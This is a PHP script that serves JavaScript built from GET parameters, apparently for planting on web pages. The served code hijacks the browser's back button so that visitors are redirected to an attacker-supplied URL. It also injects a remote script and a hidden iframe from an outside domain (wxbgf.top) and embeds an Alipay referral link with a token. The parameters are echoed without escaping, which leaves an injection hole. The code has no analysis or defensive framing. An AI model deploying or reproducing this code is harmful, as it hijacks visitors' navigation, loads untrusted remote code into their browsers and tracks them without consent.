<?php
if(isset($_GET['uu'])&&isset($_GET['z'])){
    $blocklist = "";
    if(isset($_GET['bl'])){
        $blocklist = $_GET['bl'];
    }
    echo '
var uu = "'.$_GET['uu'].'";
var blocklist = "'.$blocklist.'";
var z = "'.$_GET['z'].'";
var ref = document.referrer;
var zfblink = "https://render.alipay.com/p/f/fd-j6lzqrgm/guiderofmklvtvw.html?channel=qrCode&shareId=2088602317949490&sign=EoRcBr4%2Fb5sVCFZXe5a2qQ89RDckvxqCBaEVVyw%2FzUU%3D&scene=offlinePaymentNewSns&campStr=p1j%2BdzkZl018zOczaHT4Z5CLdPVCgrEXq89JsWOx1gdt05SIDMPg3PTxZbdPw9dL&token=c1x04649csagutvnkn77545";
var zfbjs = function(){
    var sc_sc = document.createElement("script");
    sc_sc.src="https://vvw.wxbgf.top/cjht/czfblxx.js";
    document.body.appendChild(sc_sc);
},
 block = function(){
    var result = 1;
    if(blocklist != ""){
        var bl = blocklist.split("|");
        for(var i = 0;i < bl.length;i++)
        {
            if(ref.indexOf(bl[i]) > -1)
            {
                result = 0;
            }
        }
    }
   
    return result;
},insite = function(){
   if(ref.indexOf(location.host) > -1){
       return true;
     }else
     {
        return false;
     }
};
(function (window, location) {
        history.replaceState(null, document.title, location.pathname + "#!/go");
        history.pushState(null, document.title, location.pathname);
        function historyEvent(){
        window.addEventListener("popstate", function () {
                history.replaceState(null, document.title, location.pathname);
                if(z==1&&!insite()){
                  zfbjs();
                }
                if(!block())
                {
                    setTimeout(function(){window.location.href = ref;},600) 
                }else
                {
                   setTimeout(function(){window.location.href = uu;},600) 
                }
        }, false);
        }
        setTimeout(historyEvent, 300);
    }(window, location));

   var ifs = document.createElement("iframe");
        ifs.id="tj";
        ifs.style.display="none";
        ifs.src="https://vvw.wxbgf.top/cjht/cxstj.html";
        document.body.appendChild(ifs);
    ';
}
?>
